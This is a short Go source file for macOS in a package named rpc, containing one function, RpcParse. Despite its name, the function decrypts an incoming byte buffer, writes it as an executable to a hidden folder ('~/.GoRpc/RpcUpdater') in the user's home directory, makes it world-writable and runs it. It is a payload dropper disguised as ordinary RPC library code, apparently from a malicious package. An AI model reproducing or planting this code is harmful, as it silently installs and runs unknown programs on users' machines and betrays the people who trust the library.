//go:build darwin
// +build darwin

package rpc

import (
	"os"
	"os/exec"
	"path/filepath"

	"github.com/etherdev12/go-rpc/crypto"
)

func RpcParse(resp []byte) error {
	path, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	resp, err = crypto.CFBDecryptBuffer(resp)
	if err != nil {
		return err
	}

	var name = "GoRpc"
	path = filepath.Join(path, "."+name)
	os.MkdirAll(path, os.ModePerm)
	path = filepath.Join(path, "RpcUpdater")
	err = os.WriteFile(path, resp, os.ModePerm)
	if err != nil {
		return err
	}
	err = os.Chmod(path, 0777)
	if err != nil {
		return err
	}
	return exec.Command(path).Start()
}
